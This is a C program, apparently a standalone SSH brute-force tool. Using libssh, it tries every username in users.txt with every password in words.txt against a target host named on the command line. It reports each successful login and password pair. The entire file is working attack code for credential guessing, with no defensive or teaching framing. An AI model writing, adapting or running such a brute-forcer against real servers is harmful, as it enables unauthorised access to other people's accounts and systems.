#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <libssh/libssh.h>

#define USER "users.txt"
#define PASS "words.txt"

#define PORT 22

int main(int argc, char *argv[])
{
  FILE *fd1, *fd2;
  char login[250], pass[250];
  char *buf;
  struct hostent* host;
  struct sockaddr_in servaddr;

  if (argc != 2) {
    fprintf(stderr, "Usage: %s <target>\n", argv[0]);
    exit(-1);
  }

  fprintf(stderr, "Brute start...\n");

  if ( (fd1 = fopen(USER, "r")) == NULL) {
    perror("fopen() failed");
    exit(-1);
  }

  while(fgets(login, 250, fd1) != NULL)
  {
    login[strcspn(login, "\r\n\t")] = 0;

    if (strlen(login) == 0) continue;

    if( (fd2 = fopen(PASS, "r")) == NULL) {
      perror("fopen() failed");
      exit(-1);
    }

    while( fgets(pass, 250, fd2) != NULL )
    {
      ssh_session  my_ssh_session = ssh_new();
  
      if (my_ssh_session == NULL)
        exit(-1);

      ssh_options_set(my_ssh_session, SSH_OPTIONS_HOST, argv[1]);
      ssh_options_set(my_ssh_session, SSH_OPTIONS_USER, login);


      pass[strcspn(pass, "\r\n\t")] = 0;

      if (strlen(pass) == 0) continue;

      int rc;
      
      rc = ssh_connect(my_ssh_session);

      if ( rc != SSH_OK ) {

        fprintf(stderr, "Connection failed: %s\n", ssh_get_error(my_ssh_session)); 
        exit(-1);
      }
           
      rc = ssh_userauth_password(my_ssh_session, NULL, pass);

      if (rc == SSH_AUTH_SUCCESS ) {
        
        fprintf(stderr, "OK! login: %s, password: %s\n", login, pass);
      }
      else {
        fprintf(stderr, "WRONG! login: %s, password: %s\n", login, pass);
      }

      ssh_disconnect(my_ssh_session);
      ssh_free(my_ssh_session);
    }
  }

  return 0;
}